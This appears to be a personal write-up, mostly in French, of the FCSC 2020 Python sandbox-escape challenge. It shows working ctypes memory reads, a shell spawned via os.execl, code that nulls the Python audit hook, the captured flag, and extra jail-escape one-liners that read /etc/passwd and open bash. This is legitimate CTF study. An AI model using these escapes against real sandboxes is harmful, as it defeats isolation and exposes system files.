@@ -1,0 +1,296 @@
+socat - TCP:challenges1.france-cybersecurity-challenge.fr:4005
+
+    Python 3.8.2 (default, Apr  1 2020, 15:52:55) 
+    [GCC 9.3.0] on linux
+    >>> print_flag
+    Traceback (most recent call last):
+      File "<stdin>", line 1, in <module>
+    NameError: name 'print_flag' is not defined
+
+    >>> globals()   
+    {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>}
+    >>> import os
+    Exception ignored in audit hook:
+    Exception: Action interdite
+    Exception: Module non autorisé
+    Traceback (most recent call last):
+      File "<stdin>", line 1, in <module>
+    Exception: Action interdite
+
+    >>> eval('1+1')
+    Traceback (most recent call last):
+      File "<stdin>", line 1, in <module>
+    Exception: Action interdite
+
+    >>> exec('1+1')
+    Traceback (most recent call last):
+      File "<stdin>", line 1, in <module>
+    Exception: Action interdite
+
+
+    >>> ().__class__.__bases__[0].__subclasses__()
+    >>> print('\n'.join(f"{i} {n!r}" for i, n in enumerate(().__class__.__bases__[0].__subclasses__())))
+    0 <class 'type'>
+    1 <class 'weakref'>
+    2 <class 'weakcallableproxy'>
+    3 <class 'weakproxy'>
+    4 <class 'int'>
+    5 <class 'bytearray'>
+    6 <class 'bytes'>
+    7 <class 'list'>
+    8 <class 'NoneType'>
+    9 <class 'NotImplementedType'>
+    10 <class 'traceback'>
+    11 <class 'super'>
+    12 <class 'range'>
+    13 <class 'dict'>
+    14 <class 'dict_keys'>
+    15 <class 'dict_values'>
+    16 <class 'dict_items'>
+    17 <class 'dict_reversekeyiterator'>
+    18 <class 'dict_reversevalueiterator'>
+    19 <class 'dict_reverseitemiterator'>
+    20 <class 'odict_iterator'>
+    21 <class 'set'>
+    22 <class 'str'>
+    23 <class 'slice'>
+    24 <class 'staticmethod'>
+    25 <class 'complex'>
+    26 <class 'float'>
+    27 <class 'frozenset'>
+    28 <class 'property'>
+    29 <class 'managedbuffer'>
+    30 <class 'memoryview'>
+    31 <class 'tuple'>
+    32 <class 'enumerate'>
+    33 <class 'reversed'>
+    34 <class 'stderrprinter'>
+    35 <class 'code'>
+    36 <class 'frame'>
+    37 <class 'builtin_function_or_method'>
+    38 <class 'method'>
+    39 <class 'function'>
+    40 <class 'mappingproxy'>
+    41 <class 'generator'>
+    42 <class 'getset_descriptor'>
+    43 <class 'wrapper_descriptor'>
+    44 <class 'method-wrapper'>
+    45 <class 'ellipsis'>
+    46 <class 'member_descriptor'>
+    47 <class 'types.SimpleNamespace'>
+    48 <class 'PyCapsule'>
+    49 <class 'longrange_iterator'>
+    50 <class 'cell'>
+    51 <class 'instancemethod'>
+    52 <class 'classmethod_descriptor'>
+    53 <class 'method_descriptor'>
+    54 <class 'callable_iterator'>
+    55 <class 'iterator'>
+    56 <class 'pickle.PickleBuffer'>
+    57 <class 'coroutine'>
+    58 <class 'coroutine_wrapper'>
+    59 <class 'InterpreterID'>
+    60 <class 'EncodingMap'>
+    61 <class 'fieldnameiterator'>
+    62 <class 'formatteriterator'>
+    63 <class 'BaseException'>
+    64 <class 'hamt'>
+    65 <class 'hamt_array_node'>
+    66 <class 'hamt_bitmap_node'>
+    67 <class 'hamt_collision_node'>
+    68 <class 'keys'>
+    69 <class 'values'>
+    70 <class 'items'>
+    71 <class 'Context'>
+    72 <class 'ContextVar'>
+    73 <class 'Token'>
+    74 <class 'Token.MISSING'>
+    75 <class 'moduledef'>
+    76 <class 'module'>
+    77 <class 'filter'>
+    78 <class 'map'>
+    79 <class 'zip'>
+    80 <class '_frozen_importlib._ModuleLock'>
+    81 <class '_frozen_importlib._DummyModuleLock'>
+    82 <class '_frozen_importlib._ModuleLockManager'>
+    83 <class '_frozen_importlib.ModuleSpec'>
+    84 <class '_frozen_importlib.BuiltinImporter'>
+    85 <class 'classmethod'>
+    86 <class '_frozen_importlib.FrozenImporter'>
+    87 <class '_frozen_importlib._ImportLockContext'>
+    88 <class '_thread._localdummy'>
+    89 <class '_thread._local'>
+    90 <class '_thread.lock'>
+    91 <class '_thread.RLock'>
+    92 <class '_frozen_importlib_external.WindowsRegistryFinder'>
+    93 <class '_frozen_importlib_external._LoaderBasics'>
+    94 <class '_frozen_importlib_external.FileLoader'>
+    95 <class '_frozen_importlib_external._NamespacePath'>
+    96 <class '_frozen_importlib_external._NamespaceLoader'>
+    97 <class '_frozen_importlib_external.PathFinder'>
+    98 <class '_frozen_importlib_external.FileFinder'>
+    99 <class '_io._IOBase'>
+    100 <class '_io._BytesIOBuffer'>
+    101 <class '_io.IncrementalNewlineDecoder'>
+    102 <class 'posix.ScandirIterator'>
+    103 <class 'posix.DirEntry'>
+    104 <class 'zipimport.zipimporter'>
+    105 <class 'zipimport._ZipImportResourceReader'>
+    106 <class '_ast.AST'>
+    107 <class 'codecs.Codec'>
+    108 <class 'codecs.IncrementalEncoder'>
+    109 <class 'codecs.IncrementalDecoder'>
+    110 <class 'codecs.StreamReaderWriter'>
+    111 <class 'codecs.StreamRecoder'>
+    112 <class '_abc_data'>
+    113 <class 'abc.ABC'>
+    114 <class 'dict_itemiterator'>
+
+    >>> dir(__builtins__)
+    ['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
+
+    >>> import ctypes
+    >>> ctypes
+    <module 'ctypes' from '/usr/lib/python3.8/ctypes/__init__.py'>
+
+    >>> libc = ctypes.CDLL('libc.so.6')
+    Exception: Nom de fichier interdit
+    Traceback (most recent call last):
+      File "<stdin>", line 1, in <module>
+      File "/usr/lib/python3.8/ctypes/__init__.py", line 373, in __init__
+        self._handle = _dlopen(self._name, mode)
+    Exception: Action interdite
+
+    >>> id(1)
+    Traceback (most recent call last):
+      File "<stdin>", line 1, in <module>
+    Exception: Action interdite
+
+    >>> ctypes.memmove
+    <CFunctionType object at 0x7fd841c91280>
+
+    >>> size=0x1000
+    >>> addr=0x7fd841c91280&~0xfff        
+    >>> data = (ctypes.c_byte * size)()
+    >>> ctypes.memmove(data, ctypes.c_void_p(addr), size)
+    94225568495056
+    >>> data
+    <__main__.c_byte_Array_4096 object at 0x7fd841d802c0>
+    >>> bytes(data)
+    b'\x06\x00\x00\x00\x00\x00\x00\x00\xf0\x10\xc9A\xd8\x7f\x00\x00\x00P\xc9A\xd8\x7f
+
+    import ctypes
+    ctypes.memmove
+    addr = 0x7f07b3ac9280 & ~0xfff
+    size = 0x1000
+    data = (ctypes.c_byte * size)()
+    while True:
+        ctypes.memmove(data, ctypes.c_void_p(addr), size)
+        if b'FCSC{' in bytes(data):
+            print(bytes(data))
+            break
+        addr -= size
+
+    >>> ctypes.string_at(0x400000)
+    timeout: the monitored command dumped core
+
+
+    >>> import sys
+    >>> sys
+    <module 'sys' (built-in)>
+
+    >>> def f():
+    ...  return 1
+    ... 
+    >>> f
+    <function f at 0x7fc5f6a28c10>
+
+
+Accès à la mémoire:
+
+    import ctypes
+    def getmem(addr,size):
+      data = (ctypes.c_byte * size)()
+      ctypes.memmove(data, ctypes.c_void_p(addr), size)
+      return bytes(data)
+
+    x=getmem(0x7f7540a10000,0x100000); b'print_flag'  in x.replace(b'\0',b'')
+    True
+
+Shell:
+
+    >>> import ctypes
+    >>> ctypes._os
+    <module 'os' from '/usr/lib/python3.8/os.py'>
+    >>> import os
+    >>> os.execl('/bin/sh', 'sh')
+    sh: 0: can't access tty; job control turned off
+    $ pwd
+    /app
+    $ id
+    uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
+    $ ls -l
+    total 32
+    -r-------- 1 ctf-init ctf 16064 May  2 10:10 lib_flag.so
+    -r-sr-x--- 1 ctf-init ctf 14904 May  2 10:10 spython
+    $ uname -a
+    Linux whynotasandbox 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
+    $ gzip < spython | base64
+
+ldd spython:
+
+    linux-vdso.so.1 (0x000062331d17f000)
+    libpython3.8.so.1.0 => /usr/lib/libpython3.8.so.1.0 (0x000062331cd5d000)
+    lib_flag.so => not found
+    libc.so.6 => /usr/lib/libc.so.6 (0x000062331cb97000)
+    libpthread.so.0 => /usr/lib/libpthread.so.0 (0x000062331cb75000)
+    libdl.so.2 => /usr/lib/libdl.so.2 (0x000062331cb70000)
+    libutil.so.1 => /usr/lib/libutil.so.1 (0x000062331cb6b000)
+    libm.so.6 => /usr/lib/libm.so.6 (0x000062331ca23000)
+    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x000062331d181000)
+
+
+Solution:
+
+    import ctypes
+    prt = ctypes.addressof(ctypes.pythonapi._PyRuntime)
+    prt_ea = int.from_bytes(ctypes.string_at(prt, 8), "little")
+    ctypes.memmove(prt_ea + 0x5b0, b"\x00" * 8, 8)  # set _PyRuntime.audit_hook_head to NULL
+    lib = ctypes.cdll.LoadLibrary("lib_flag.so")
+    lib.print_flag()
+
+Ou:
+
+    >>> ctypes.pythonapi["print_flag"]()
+    super flag: FCSC{55660e5c9e048d988917e2922eb1130063ebc1030db025a81fd04bda75bab1c3}
+    83
+
+
+Dump lib_flag.so from memory:
+
+    7fd829c9b000-7fd829c9c000 r--p 00000000 09:03 16782943                   /app/lib_flag.so
+    7fd829c9c000-7fd829c9d000 r-xp 00001000 09:03 16782943                   /app/lib_flag.so
+    7fd829c9d000-7fd829c9e000 r--p 00002000 09:03 16782943                   /app/lib_flag.so
+    7fd829c9e000-7fd829c9f000 r--p 00002000 09:03 16782943                   /app/lib_flag.so
+    7fd829c9f000-7fd829ca0000 rw-p 00003000 09:03 16782943                   /app/lib_flag.so
+
+    >>> lib_flag = getmem(0x7fd829c9b000,0x7fd829ca0000-0x7fd829c9b000)
+
+https://ctf.feisu.win/2020/fcsc_prequals_2020/why_not_a_sandbox
+    Autres idées de sandbox escape Python:
+        >>> L = __loader__.load_module
+        >>> L('binascii')
+        <module 'binascii' (built-in)>
+        >>> open = L('codecs').open
+        >>> open('/etc/passwd', 'r').read()
+        >>> sys = L('sys')
+        >>> os = sys.meta_path[2].find_module('os').load_module('os')
+            # Use sys.meta_path[2] = <class '_frozen_importlib_external.PathFinder'>
+            # find_module(fullname, path=None) method of builtins.type instance
+            #     find the module on sys.path or 'path' based on sys.path_hooks and
+            #     sys.path_importer_cache.
+        >>> shell = lambda: os.execl('/bin/bash','/bin/bash')
+        >>> shell()
+
+        + https://germano.dev/fuckpyjails/ : interactive shell from eval()
+            (lambda code, sys: ((setattr(code.InteractiveConsole, 'runcode', lambda self, cod: (code.InteractiveInterpreter.runcode(self, cod), sys.stdout.flush(), sys.stderr.flush())[0]), code.InteractiveConsole(globals()).interact())))(__import__('code'), __import__('sys'))
